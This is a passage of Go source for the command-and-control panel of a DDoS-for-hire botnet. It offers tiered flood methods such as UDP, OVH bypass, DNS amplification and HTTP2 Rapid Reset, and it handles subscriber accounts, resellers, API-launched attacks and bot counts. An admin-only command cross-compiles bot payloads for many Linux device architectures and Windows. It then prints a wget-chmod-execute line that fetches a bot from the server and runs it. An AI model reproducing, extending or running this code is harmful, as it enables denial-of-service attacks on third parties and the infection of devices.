				{"HOLD", "VIP", "TCP Connection Hold Flood"},
				{"OVHUDP", "ALL", "OVH UDP Flood Bypass"},
				{"MIX", "ALL", "TCP and UDP Flood Bypass"},
				{"HEX", "ALL", "HEX Flood"},
				{"MCPE", "VIP", "Minecraft PE Status Ping Protocol"},
				{"FIVEM", "VIP", "Send FiveM Status Ping Protocol"},
				{"DISCORD", "VIP", "UDP based string flood for voip."},
				{"FORTNITE", "VIP", "Fortnite UDP Flood"},
				{"UDP", "ALL", "Standard UDP Flood"},
				{"ICMP", "VIP", "ICMP Ping Flood"},
				{"SSH", "VIP", "PuTTY SSH Socket Flood Using Legitimate SSH Connections"},
				{"GAME", "VIP", "Valid UDP Data + Dynamic string UDP Flood"},
				{"DNS", "VIP", "Dns Amplification based flood, for high GBPS"},
			}
			for _, m := range l4Methods {
				namePart := fmt.Sprintf("%s%s", ColorBlue, m.Name)

				dots := 18 - len(m.Name)
				if dots < 1 {
					dots = 1
				}
				dotsPart := ColorGray + strings.Repeat(".", dots) + ColorReset

				var tagColored string
				if m.Tag == "VIP" {
					tagColored = fmt.Sprintf("%s[VIP]%s    ", ColorVIP, ColorReset)
				} else {
					tagColored = fmt.Sprintf("%s[ALL]%s    ", ColorBasic, ColorReset)
				}

				descPart := ColorWhite + m.Desc + ColorReset

				t.Write([]byte(fmt.Sprintf("%s %s %s%s\r\n", namePart, dotsPart, tagColored, descPart)))
				time.Sleep(40 * time.Millisecond)
			}

			t.Write([]byte("\r\n"))

			l7Methods := []struct {
				Name string
				Tag  string
				Desc string
			}{
				{"TLS", "ALL", "Standard HTTP Flooder"},
				{"TLSPLUS", "VIP", "Premium HTTPS Flooder"},
				{"XRESET", "VIP", "HTTP2 Rapid Reset Flooder"},
			}
			for _, m := range l7Methods {
				namePart := fmt.Sprintf("%s%s", ColorBlue, m.Name)

				dots := 18 - len(m.Name)
				if dots < 1 {
					dots = 1
				}
				dotsPart := ColorGray + strings.Repeat(".", dots) + ColorReset

				var tagColored string
				if m.Tag == "VIP" {
					tagColored = fmt.Sprintf("%s[VIP]%s    ", ColorVIP, ColorReset)
				} else {
					tagColored = fmt.Sprintf("%s[ALL]%s    ", ColorBasic, ColorReset)
				}

				descPart := ColorWhite + m.Desc + ColorReset

				t.Write([]byte(fmt.Sprintf("%s %s %s%s\r\n", namePart, dotsPart, tagColored, descPart)))
				time.Sleep(40 * time.Millisecond)
			}

		case "credits":
			t.Write([]byte(fmt.Sprintf(`
%sDeveloper: %s@nyxdev%s
%sDiscord: %s@nyxdev%s
%sTelegram: %st.me/nyxdev%s
`,
				ColorGray, cRed, ColorGray,
				ColorGray, cRed, ColorGray,
				ColorGray, cRed, ColorGray)))

		case "owner":
			t.Write([]byte(ClearScreen))

			ownerText := "" +
				ColorBlue + "Instagram: " + ColorReset + ColorCyan + "itsgentox" + ColorReset + "\r\n" +
				ColorBlue + "Tiktok:    " + ColorReset + ColorCyan + "zqr.rk" + ColorReset + "\r\n" +
				ColorBlue + "Discord:   " + ColorReset + ColorCyan + "a5pt" + ColorReset + "\r\n" +
				ColorBlue + "Telegram:  " + ColorReset + ColorCyan + "fr3sq" + ColorReset + "\r\n" +
				"\r\n" +
				ColorBlue + "Tiktok:    " + ColorReset + ColorCyan + ".sixfigs" + ColorReset + "\r\n" +
				ColorBlue + "Discord:   " + ColorReset + ColorCyan + "sixfigs.cuh" + ColorReset + "\r\n" +
				ColorBlue + "Twitter:   " + ColorReset + ColorCyan + "sixteenfigs" + ColorReset + "\r\n"

			t.Write([]byte(ownerText))

		case "clear", "cls":
			t.Write([]byte(ClearScreen))
			t.Write([]byte(welcome))

		case "passwd", "password":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}

			t.Write([]byte(ColorWhite + "Current password: " + ColorReset))
			oldPass, err := t.ReadLine()
			if err != nil {
				continue
			}
			oldPass = strings.TrimSpace(oldPass)

			if oldPass != u.Password {
				t.Write([]byte(ColorRed + "Current password is incorrect.\r\n" + ColorReset))
				continue
			}

			t.Write([]byte(ColorWhite + "New password: " + ColorReset))
			newPass, err := t.ReadLine()
			if err != nil {
				continue
			}
			newPass = strings.TrimSpace(newPass)

			if len(newPass) < 3 {
				t.Write([]byte(ColorRed + "New password must be at least 3 characters.\r\n" + ColorReset))
				continue
			}

			t.Write([]byte(ColorWhite + "Confirm new password: " + ColorReset))
			confirmPass, err := t.ReadLine()
			if err != nil {
				continue
			}
			confirmPass = strings.TrimSpace(confirmPass)

			if newPass != confirmPass {
				t.Write([]byte(ColorRed + "Passwords do not match.\r\n" + ColorReset))
				continue
			}

			if newPass == u.Password {
				t.Write([]byte(ColorYellow + "New password is the same as the old one.\r\n" + ColorReset))
				continue
			}

			u.Password = newPass
			users[username] = u

			if err := saveUsers(users); err != nil {
				t.Write([]byte(ColorRed + fmt.Sprintf("Failed to save password: %v\r\n", err) + ColorReset))
				continue
			}

			t.Write([]byte(ColorGreen + "[+] Password changed successfully and saved to database.\r\n" + ColorReset))

		case "myip":
			t.Write([]byte(ColorWhite + "Fetching your IP information...\r\n" + ColorReset))

			if clientIP == "" {
				t.Write([]byte(ColorRed + "Failed to fetch your IP.\r\n" + ColorReset))
				continue
			}

			isp, country := getISP(clientIP)

			t.Write([]byte(ClearScreen))
			t.Write([]byte(fmt.Sprintf("%sYour IP:%s %s%s%s\r\n", ColorGray, ColorReset, ColorWhite, clientIP, ColorReset)))
			t.Write([]byte(fmt.Sprintf("%sISP:%s %s%s%s\r\n", ColorGray, ColorReset, ColorWhite, isp, ColorReset)))
			t.Write([]byte(fmt.Sprintf("%sCountry:%s %s%s%s\r\n", ColorGray, ColorReset, ColorWhite, country, ColorReset)))

		case "portcheck":
			if len(args) < 3 {
				t.Write([]byte(ClearScreen))
				t.Write([]byte(ColorWhite + "Usage: portcheck <ip> <port>\r\n" + ColorReset))
				t.Write([]byte(ColorGray + "Example: portcheck 1.1.1.1 80\r\n" + ColorReset))
				continue
			}

			ip := args[1]
			portStr := args[2]
			portNum, err := strconv.Atoi(portStr)
			if err != nil || portNum < 1 || portNum > 65535 {
				t.Write([]byte(ClearScreen))
				t.Write([]byte(ColorRed + "Invalid port. Must be between 1 and 65535.\r\n" + ColorReset))
				continue
			}

			conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, portStr), 3*time.Second)
			status := "CLOSED or unreachable"
			statusColor := ColorRed
			if err == nil {
				conn.Close()
				status = "OPEN"
				statusColor = ColorGreen
			}

			t.Write([]byte(ClearScreen))
			t.Write([]byte(fmt.Sprintf("%sTarget IP:%s %s%s%s\r\n", ColorGray, ColorReset, ColorWhite, ip, ColorReset)))
			t.Write([]byte(fmt.Sprintf("%sPort:%s %s%s%s\r\n", ColorGray, ColorReset, ColorWhite, portStr, ColorReset)))
			t.Write([]byte(fmt.Sprintf("%sStatus:%s %s%s%s\r\n", ColorGray, ColorReset, statusColor, status, ColorReset)))

		case "plan":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}

			vipStr := "False"
			if u.VIP {
				vipStr = "True"
			}
			resellerStr := "False"
			if u.Reseller {
				resellerStr = "True"
			}
			adminStr := "False"
			if u.Admin {
				adminStr = "True"
			}

			expiryDays := float64(u.Expiry-time.Now().Unix()) / 86400
			if expiryDays < 0 {
				expiryDays = 0
			}

			B := ColorBlue
			W := ColorWhite
			R := ColorReset

			planText := ClearScreen + "\r\n" +
				B + "╔═════════════════════════════════════════════════════════════╗" + R + "\r\n" +
				B + "║" + R + "                    " + B + "PLAN INFORMATION" + R + "                         " + B + "║" + R + "\r\n" +
				B + "╠═════════════════════════════════════════════════════════════╣" + R + "\r\n" +
				B + "║ " + R + W + "Username:               " + username + R + "\r\n" +
				B + "║ " + R + W + "Max Attack Time:        " + fmt.Sprintf("%d", u.MaxTime) + R + "\r\n" +
				B + "║ " + R + W + "Concurrents:            " + fmt.Sprintf("%d", u.Concurrents) + R + "\r\n" +
				B + "║ " + R + W + "Cooldown:               " + fmt.Sprintf("%d", u.Cooldown) + R + "\r\n" +
				B + "║ " + R + W + "VIP Status:             " + vipStr + R + "\r\n" +
				B + "║ " + R + W + "Reseller Status:        " + resellerStr + R + "\r\n" +
				B + "║ " + R + W + "Administrator Status:   " + adminStr + R + "\r\n" +
				B + "║ " + R + W + "Expires In:             " + fmt.Sprintf("%.2f Days", expiryDays) + R + "\r\n" +
				B + "╚═════════════════════════════════════════════════════════════╝" + R + "\r\n"

			t.Write([]byte(planText))

		case "ongoing":
			ongoingStop := make(chan struct{})
			ongoingDone := make(chan struct{})

			go func() {
				defer close(ongoingDone)
				buf := make([]byte, 1)
				for {
					n, err := channel.Read(buf)
					if err != nil {
						return
					}
					if n > 0 && (buf[0] == '\r' || buf[0] == '\n') {
						select {
						case <-ongoingStop:
						default:
							close(ongoingStop)
						}
						return
					}
				}
			}()

			ongoingTicker := time.NewTicker(1 * time.Second)

			renderOngoing := func() {
				activeAttacksMu.Lock()
				attacksCopy := append([]AttackInfo(nil), activeAttacks[username]...)
				activeAttacksMu.Unlock()

				var sb strings.Builder
				sb.WriteString(ClearScreen)

				sb.WriteString(ColorBlue + "╔══════════════════════════════════════════════════════════════╗\r\n")
				sb.WriteString("║" + ColorReset + "                    " + ColorWhite + "ONGOING ATTACKS" + ColorReset + "                           " + ColorBlue + "║\r\n")
				sb.WriteString("╠══════════════════════════════════════════════════════════════╣\r\n")

				if len(attacksCopy) == 0 { 
					sb.WriteString("║" + ColorReset + ColorRed + "  No active attacks currently." + strings.Repeat(" ", 31) + ColorBlue +                                        "║\r\n")
				} else {
					sb.WriteString("║" + ColorReset + ColorBlue + fmt.Sprintf("  %-16s %-10s %-12s %-14s", "Target", "Method", "Time Left", "ISP") +                             "║\r\n")
					sb.WriteString("╟" + strings.Repeat("─", 62) + "╢\r\n")

					for _, atk := range attacksCopy {
						remaining := atk.EndTime - time.Now().Unix()
						if remaining < 0 {
							remaining = 0
						}
						isp := atk.ISP
						if isp == "" {
							isp = "Unknown"
						}
						if len(isp) > 14 {
							isp = isp[:14]
						}
						target := atk.Target
						if len(target) > 16 {
							target = target[:16]
						}
						method := atk.Method
						if len(method) > 10 {
							method = method[:10]
						}
						line := fmt.Sprintf("  %-16s %-10s %-12s %-14s", target, method, fmt.Sprintf("%ds", remaining), isp)
						sb.WriteString("║" + ColorReset + ColorWhite + line + ColorBlue + "║\r\n")
					}
				}

				sb.WriteString("╠══════════════════════════════════════════════════════════════╣\r\n")
				sb.WriteString("║" + ColorReset + ColorYellow + "  Press [ENTER] to go back" + strings.Repeat(" ", 35) + ColorBlue +                               "║\r\n")
				sb.WriteString("╚══════════════════════════════════════════════════════════════╝" + ColorReset + "\r\n")

				t.Write([]byte(sb.String()))
			}

			renderOngoing()

		ongoingLoop:
			for {
				select {
				case <-ongoingStop:
					break ongoingLoop
				case <-ongoingTicker.C:
					renderOngoing()
				case <-kickCh:
					ongoingTicker.Stop()
					t.Write([]byte("\r\n\033[91m[!] Your session has been terminated.\033[0m\r\n"))
					return
				}
			}
			ongoingTicker.Stop()

			select {
			case <-ongoingDone:
			case <-time.After(100 * time.Millisecond):
			}

			t.Write([]byte(ClearScreen))
			t.Write([]byte(welcome))

		case "users":
			users, _ := loadUsers()
			currentUser, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !currentUser.Admin {
				t.Write([]byte(ColorGray + "Only admins can use this command.\r\n" + ColorReset))
				continue
			}
			if len(args) < 2 {
				t.Write([]byte("  users list    - List all users\r\n"))
				t.Write([]byte("  users add     - Add a user\r\n"))
				t.Write([]byte("  users delete  - Delete a user\r\n"))
				continue
			}
			subCmd := strings.ToLower(args[1])
			switch subCmd {
			case "list":
				t.Write([]byte(fmt.Sprintf("%-15s | %-10s | %-10s | %-10s\r\n", "Username", "Expiry D", "Admin", "VIP")))
				t.Write([]byte(strings.Repeat("-", 55) + "\r\n"))
				for name, u := range users {
					adminStr := "No"
					if u.Admin {
						adminStr = "Yes"
					}
					vipStr := "No"
					if u.VIP {
						vipStr = "Yes"
					}
					remainingDays := float64(u.Expiry-time.Now().Unix()) / 86400
					if remainingDays < 0 {
						remainingDays = 0
					}
					t.Write([]byte(fmt.Sprintf("%-15s | %-10.2f | %-10s | %-10s\r\n", name, remainingDays, adminStr, vipStr)))
				}

			case "add":
				var newUser, newPass string
				var isAdmin, isVIP, isReseller, isAPI, isBetaAccess bool
				var concurrents, maxTime, cooldown int

				t.Write([]byte("Username: "))
				newUser, _ = t.ReadLine()
				newUser = strings.TrimSpace(newUser)
				if newUser == "" {
					t.Write([]byte("Operation cancelled: username cannot be empty.\r\n"))
					continue
				}
				if _, exists := users[newUser]; exists {
					t.Write([]byte(fmt.Sprintf("User %s already exists!\r\n", newUser)))
					continue
				}

				t.Write([]byte("Password: "))
				newPass, _ = t.ReadLine()
				newPass = strings.TrimSpace(newPass)

				t.Write([]byte("Expiry (days): "))
				expiryStr, _ := t.ReadLine()
				var days float64
				fmt.Sscanf(expiryStr, "%f", &days)
				if days <= 0 {
					days = 30
				}
				expiryTimestamp := time.Now().Add(time.Duration(days*24) * time.Hour).Unix()

				t.Write([]byte("Admin (y/n): "))
				adminStr, _ := t.ReadLine()
				if strings.ToLower(strings.TrimSpace(adminStr)) == "y" {
					isAdmin = true
				}

				t.Write([]byte("VIP (y/n): "))
				vipStr, _ := t.ReadLine()
				if strings.ToLower(strings.TrimSpace(vipStr)) == "y" {
					isVIP = true
				}

				t.Write([]byte("Reseller (y/n): "))
				resellerStr, _ := t.ReadLine()
				if strings.ToLower(strings.TrimSpace(resellerStr)) == "y" {
					isReseller = true
				}

				t.Write([]byte("API Access (y/n): "))
				apiStr, _ := t.ReadLine()
				if strings.ToLower(strings.TrimSpace(apiStr)) == "y" {
					isAPI = true
				}

				t.Write([]byte("Beta Access (y/n): "))
				betaStr, _ := t.ReadLine()
				if strings.ToLower(strings.TrimSpace(betaStr)) == "y" {
					isBetaAccess = true
				}

				t.Write([]byte("Concurrents: "))
				concurrentsStr, _ := t.ReadLine()
				fmt.Sscanf(concurrentsStr, "%d", &concurrents)
				if concurrents <= 0 {
					concurrents = 1
				}

				t.Write([]byte("Cooldown (seconds): "))
				cooldownStr, _ := t.ReadLine()
				fmt.Sscanf(cooldownStr, "%d", &cooldown)
				if cooldown <= 0 {
					cooldown = 30
				}

				t.Write([]byte("Max Attack Duration: "))
				maxTimeStr, _ := t.ReadLine()
				fmt.Sscanf(maxTimeStr, "%d", &maxTime)
				if maxTime <= 0 {
					maxTime = 60
				}

				users[newUser] = User{
					Password:    newPass,
					MaxTime:     maxTime,
					Concurrents: concurrents,
					Cooldown:    cooldown,
					Expiry:      expiryTimestamp,
					Admin:       isAdmin,
					VIP:         isVIP,
					Reseller:    isReseller,
					API:         isAPI,
					BetaAccess:  isBetaAccess,
				}

				if err := saveUsers(users); err != nil {
					t.Write([]byte(fmt.Sprintf("Failed to save: %v\r\n", err)))
				} else {
					t.Write([]byte(fmt.Sprintf("\r\nUser %s created successfully.\r\n", newUser)))
				}
			case "delete":
				if len(args) < 3 {
					t.Write([]byte("Usage: users delete [user]\r\n"))
					continue
				}
				target := args[2]
				if target == "gentox" {
					t.Write([]byte("Cannot delete gentox user!\r\n"))
					continue
				}
				if _, exists := users[target]; !exists {
					t.Write([]byte(fmt.Sprintf("User %s does not exist.\r\n", target)))
					continue
				}
				delete(users, target)
				if err := saveUsers(users); err != nil {
					t.Write([]byte(fmt.Sprintf("Failed to save: %v\r\n", err)))
				} else {
					go kickUser(target)
					t.Write([]byte(fmt.Sprintf("User %s deleted and kicked.\r\n", target)))
				}
			}

		case "!bot":
			if username != "gentox" {
				t.Write([]byte(ColorGray + "Only gentox can use this command.\r\n" + ColorReset))
				continue
			}
			if len(args) < 2 {
				t.Write([]byte("Usage: !bot on/off\r\n"))
				continue
			}
			state := strings.ToLower(args[1])

			if state == "on" {
				botPauseMu.Lock()
				botPaused = false
				botPauseMu.Unlock()
				t.Write([]byte(fmt.Sprintf("%s[+] Bot attacks resumed.%s\r\n", ColorGreen, ColorReset)))
			} else if state == "off" {
				botPauseMu.Lock()
				botPaused = true
				botPauseMu.Unlock()

				activeAttacksMu.Lock()
				var stops []string
				for user := range activeAttacks {
					for _, atk := range activeAttacks[user] {
						stops = append(stops, fmt.Sprintf("stop %s", atk.Target))
					}
					activeAttacks[user] = []AttackInfo{}
				}
				activeAttacksMu.Unlock()

				for _, s := range stops {
					broadcast(s)
				}

				t.Write([]byte(fmt.Sprintf("%s[+] Bot attacks paused and all attacks stopped.%s\r\n", ColorRed, ColorReset)))
			} else {
				t.Write([]byte("Invalid option. Use !bot on or !bot off\r\n"))
			}

		case "suicide":
			users, _ := loadUsers()
			currentUser, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !currentUser.Admin {
				t.Write([]byte(ColorGray + "Only admins can use this command.\r\n" + ColorReset))
				continue
			}

			activeAttacksMu.Lock()
			var targets []string
			for user := range activeAttacks {
				for _, atk := range activeAttacks[user] {
					targets = append(targets, atk.Target)
				}
				activeAttacks[user] = []AttackInfo{}
			}
			activeAttacksMu.Unlock()

			for _, tgt := range targets {
				broadcast(fmt.Sprintf("stop %s", tgt))
			}

			t.Write([]byte(fmt.Sprintf("%s[+] SUICIDE: All attacks from all users have been stopped.%s\r\n", ColorRed, ColorReset)))
			t.Write([]byte(fmt.Sprintf("%s[+] Stopped %d attack(s) total.%s\r\n", ColorGreen, len(targets), ColorReset)))

		case "configreload":
			if username != "gentox" {
				t.Write([]byte(fmt.Sprintf("Unknown command: %s\r\n", cmdName)))
				continue
			}
			newCfg := loadConfig()
			newColor := hexToANSI(newCfg.CNCColor)

			colorMu.Lock()
			colorRed = newColor
			colorMu.Unlock()

			t.Write([]byte("Configuration reloaded. Color updated.\r\n"))
			cRed = newColor
			prompt = fmt.Sprintf("\033[1;94m┌──(\033[1;97m%s@\033[1;94mnyx)\r\n\033[1;94m└─➤ \033[0m", username)

		case "bots":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !u.Admin {
				t.Write([]byte(ColorGray + "Only admins can use this command.\r\n" + ColorReset))
				continue
			}

			count := atomic.LoadInt64(&botCount)

			archCount := make(map[string]int)
			osCount := make(map[string]int)

			bots.Range(func(key, value interface{}) bool {
				client, ok := value.(BotClient)
				if !ok {
					return true
				}

				arch := strings.ToLower(client.Arch)
				if arch == "" || arch == "unknown" {
					arch = "unknown"
				}
				archCount[arch]++

				osName := strings.ToLower(client.OS)
				if osName == "" {
					osName = "unknown"
				}
				osCount[osName]++

				return true
			})

			t.Write([]byte(ClearScreen))
			t.Write([]byte(fmt.Sprintf("%sTotal Bots Online:%s %s%d%s\r\n", ColorGray, ColorReset, ColorWhite, count, ColorReset)))
			t.Write([]byte("\r\n"))

			t.Write([]byte(fmt.Sprintf("%sArchitectures:%s\r\n", ColorWhite, ColorReset)))

			knownArches := []string{
				"x86_64", "amd64",
				"i386", "i686", "x86",
				"armv7l", "armv8l", "aarch64", "arm64",
				"mips", "mipsel", "mips64", "mips64le",
				"ppc", "ppc64", "ppc64le",
				"riscv64",
				"unknown",
			}

			printed := make(map[string]bool)
			for _, a := range knownArches {
				if cnt, ok := archCount[a]; ok && cnt > 0 {
					t.Write([]byte(fmt.Sprintf("  %s%-12s%s : %s%d%s\r\n",
						ColorBlue, a, ColorReset, cRed, cnt, ColorReset)))
					printed[a] = true
				}
			}
			for a, cnt := range archCount {
				if !printed[a] && cnt > 0 {
					t.Write([]byte(fmt.Sprintf("  %s%-12s%s : %s%d%s\r\n",
						ColorBlue, a, ColorReset, cRed, cnt, ColorReset)))
				}
			}

			t.Write([]byte("\r\n"))

			t.Write([]byte(fmt.Sprintf("%sOperating Systems:%s\r\n", ColorWhite, ColorReset)))
			for osName, cnt := range osCount {
				if cnt > 0 {
					t.Write([]byte(fmt.Sprintf("  %s%-12s%s : %s%d%s\r\n",
						ColorBlue, osName, ColorReset, cRed, cnt, ColorReset)))
				}
			}

			t.Write([]byte("\r\n"))

		case "payload":
			if username != "gentox" {
				t.Write([]byte(fmt.Sprintf("Unknown command: %s\r\n", cmdName)))
				continue
			}
			t.Write([]byte("Auto-Building Payloads (x86/x64/MIPS/ARM/PPC + Windows)...\r\n"))

			pubIP := getPublicIP()
			ldflags := fmt.Sprintf("-X main.ServerIP=%s", pubIP)

			type buildTarget struct {
				name string
				env  []string
				file string
			}

			targets := []buildTarget{
				{"Linux x86", []string{"GOOS=linux", "GOARCH=386"}, "bin/x86"},
				{"Linux x86_64", []string{"GOOS=linux", "GOARCH=amd64"}, "bin/x86_64"},
				{"Linux MIPS", []string{"GOOS=linux", "GOARCH=mips"}, "bin/mips"},
				{"Linux MIPSLE", []string{"GOOS=linux", "GOARCH=mipsle"}, "bin/mipsle"},
				{"Linux MIPS64", []string{"GOOS=linux", "GOARCH=mips64"}, "bin/mips64"},
				{"Linux MIPS64LE", []string{"GOOS=linux", "GOARCH=mips64le"}, "bin/mips64le"},
				{"Linux ARMv5", []string{"GOOS=linux", "GOARCH=arm", "GOARM=5"}, "bin/armv5"},
				{"Linux ARMv6", []string{"GOOS=linux", "GOARCH=arm", "GOARM=6"}, "bin/armv6"},
				{"Linux ARMv7", []string{"GOOS=linux", "GOARCH=arm", "GOARM=7"}, "bin/armv7"},
				{"Linux ARM64", []string{"GOOS=linux", "GOARCH=arm64"}, "bin/arm64"},
				{"Linux PPC64", []string{"GOOS=linux", "GOARCH=ppc64"}, "bin/ppc64"},
				{"Linux PPC64LE", []string{"GOOS=linux", "GOARCH=ppc64le"}, "bin/ppc64le"},
				{"Windows x64", []string{"GOOS=windows", "GOARCH=amd64"}, "bin/bot.exe"},
				{"Windows x86", []string{"GOOS=windows", "GOARCH=386"}, "bin/bot_x86.exe"},
			}

			os.MkdirAll("bin", 0755)

			for _, tgt := range targets {
				cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", tgt.file, "./Bot")
				cmd.Env = append(os.Environ(), tgt.env...)
				out, err := cmd.CombinedOutput()
				if err != nil {
					t.Write([]byte(fmt.Sprintf("\033[91m[✗] %s Build Failed: %v\033[0m\r\n", tgt.name, err)))
					if len(out) > 0 {
						t.Write([]byte(fmt.Sprintf("     \033[90m→ %s\033[0m\r\n", strings.TrimSpace(string(out)))))
					}
				} else {
					t.Write([]byte(fmt.Sprintf("%s[+] %s Payload Ready!%s (%s)\r\n", cRed, tgt.name, ColorReset, tgt.file)))
				}
			}

			t.Write([]byte(fmt.Sprintf("%sCommand:%s wget http://%s/x86; chmod +x x86; ./x86\r\n", ColorWhite, ColorReset, pubIP)))

		case "raw", "hold", "ovhudp", "mix",
			"hex", "mcpe", "fivem", "discord", "fortnite",
			"udp", "icmp", "ssh", "game", "dns":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !u.VIP {
				allowed := map[string]bool{
					"raw":    true,
					"ovhudp": true,
					"mix":    true,
					"hex":    true,
					"udp":    true,
				}
				if !allowed[cmdName] {
					t.Write([]byte(fmt.Sprintf("%sThis method is VIP only. Upgrade your plan to use it.%s\r\n", ColorWhite, ColorReset)))
					continue
				}
			}
			handleL4Attack(t, username, cmdName, args, ColorWhite, ColorReset)

		case "tls", "tlsplus":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !u.VIP && cmdName != "tls" {
				t.Write([]byte(fmt.Sprintf("%sThis method is VIP only. Upgrade your plan to use it.%s\r\n", ColorWhite, ColorReset)))
				continue
			}
			handleL7Attack(t, username, cmdName, args, ColorWhite, ColorReset)

		case "xreset":
			users, _ := loadUsers()
			u, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !u.VIP {
				t.Write([]byte(fmt.Sprintf("%sThis method is VIP only. Upgrade your plan to use it.%s\r\n", ColorWhite, ColorReset)))
				continue
			}
			handleXResetAttack(t, username, cmdName, args, ColorWhite, ColorReset)

		case "stop":
			users, _ := loadUsers()
			currentUser, ok := users[username]
			if !ok {
				t.Write([]byte(ColorRed + "User not found.\r\n" + ColorReset))
				continue
			}
			if username != "gentox" && !currentUser.Admin {
				t.Write([]byte(ColorGray + "Only admins can use this command.\r\n" + ColorReset))
				continue
			}

			if len(args) < 2 {
				t.Write([]byte("Usage: stop <target>\r\n"))
				continue
			}
			target := args[1]
			normTarget := normalizeTargetServer(target)

			activeAttacksMu.Lock()
			var newAttacks []AttackInfo
			stopped := 0
			for _, atk := range activeAttacks[username] {
				if normalizeTargetServer(atk.Target) == normTarget {
					stopped++
				} else {
					newAttacks = append(newAttacks, atk)
				}
			}
			activeAttacks[username] = newAttacks
			activeAttacksMu.Unlock()

			broadcast(fmt.Sprintf("stop %s", target))

			if stopped > 0 {
				t.Write([]byte(fmt.Sprintf("\033[92m[+] Stopped %d attack(s) on %s\033[0m\r\n",
					stopped, target)))
			} else {
				t.Write([]byte(fmt.Sprintf("\033[93m[+] Stop command sent to all bots for %s\033[0m\r\n",
					target)))
			}

		case "exit", "quit":
			t.Write([]byte("Goodbye!\r\n"))
			return

		default:
			t.Write([]byte(fmt.Sprintf("Unknown command: %s\r\n", cmdName)))
		}
	}
}

func initStorage() error {
	filePath := filepath.Join(userDir, userFile)

	defaultUsers := UserDatabase{
		"gentox": User{
			Password:    "1225",
			MaxTime:     120,
			Concurrents: 3,
			Cooldown:    15,
			VIP:         true,
			Reseller:    false,
			Admin:       true,
			BetaAccess:  true,
			Expiry:      time.Now().Add(30 * 24 * time.Hour).Unix(),
		},
	}
	defaultBytes, _ := json.MarshalIndent(defaultUsers, "", "  ")

	if _, err := os.Stat(userDir); os.IsNotExist(err) {
		if err := os.Mkdir(userDir, 0755); err != nil {
			return err
		}
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return os.WriteFile(filePath, defaultBytes, 0644)
	} else {
		_, err := loadUsers()
		if err != nil {
			log.Println("Detected old or corrupt Users.json. Migrating to new format...")
			return os.WriteFile(filePath, defaultBytes, 0644)
		}
	}
	return nil
}

func loadUsers() (UserDatabase, error) {
	filePath := filepath.Join(userDir, userFile)
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	var users UserDatabase
	if err := json.Unmarshal(data, &users); err != nil {
		return nil, err
	}
	return users, nil
}

func saveUsers(users UserDatabase) error {
	filePath := filepath.Join(userDir, userFile)
	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filePath, data, 0644)
}

func loadOrGenerateHostKey() (ssh.Signer, error) {
	const keyFile = "server.key"

	if keyData, err := os.ReadFile(keyFile); err == nil {
		return ssh.ParsePrivateKey(keyData)
	}

	log.Println("Generating new host key...")
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	privBytes := x509.MarshalPKCS1PrivateKey(key)
	pemBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privBytes,
	}
	pemBytes := pem.EncodeToMemory(pemBlock)
	if err := os.WriteFile(keyFile, pemBytes, 0600); err != nil {
		return nil, err
	}

	return ssh.NewSignerFromKey(key)
}

func handleAPI(w http.ResponseWriter, r *http.Request) {
	username := r.URL.Query().Get("username")
	password := r.URL.Query().Get("password")
	method := strings.ToLower(r.URL.Query().Get("method"))
	target := r.URL.Query().Get("target")
	portStr := r.URL.Query().Get("port")
	durationStr := r.URL.Query().Get("duration")

	users, err := loadUsers()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	u, ok := users[username]
	if !ok || u.Password != password {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	if !u.API {
		http.Error(w, "API access disabled for this user", http.StatusForbidden)
		return
	}

	if time.Now().Unix() > u.Expiry && username != "gentox" {
		http.Error(w, "Account expired", http.StatusForbidden)
		return
	}

	if method == "stop" {
		activeAttacksMu.Lock()
		attacks := append([]AttackInfo(nil), activeAttacks[username]...)
		activeAttacks[username] = []AttackInfo{}
		activeAttacksMu.Unlock()

		for _, atk := range attacks {
			broadcast(fmt.Sprintf("stop %s", atk.Target))
		}

		fmt.Fprintf(w, "Stopped %d attacks", len(attacks))
		return
	}

	if method == "" || target == "" {
		http.Error(w, "Missing method or target", http.StatusBadRequest)
		return
	}

	duration, err := strconv.Atoi(durationStr)
	if err != nil || duration <= 0 {
		http.Error(w, "Invalid duration", http.StatusBadRequest)
		return
	}

	if duration > u.MaxTime && username != "gentox" {
		http.Error(w, fmt.Sprintf("Max duration exceeded (Limit: %d)", u.MaxTime), http.StatusBadRequest)
		return
	}

	activeAttacksMu.Lock()
	if len(activeAttacks[username]) >= u.Concurrents {
		activeAttacksMu.Unlock()
		http.Error(w, "Concurrent limit reached", http.StatusTooManyRequests)
		return
	}

	isL4 := method == "raw" || method == "hold" ||
		method == "ovhudp" || method == "mix" ||
		method == "hex" || method == "mcpe" || method == "fivem" ||
		method == "discord" || method == "fortnite" ||
		method == "udp" || method == "icmp" ||
		method == "ssh" || method == "game" || method == "dns"

	isL7 := method == "tls" || method == "tlsplus"

	var cmd string
	if method == "xreset" {
		if portStr == "" {
			activeAttacksMu.Unlock()
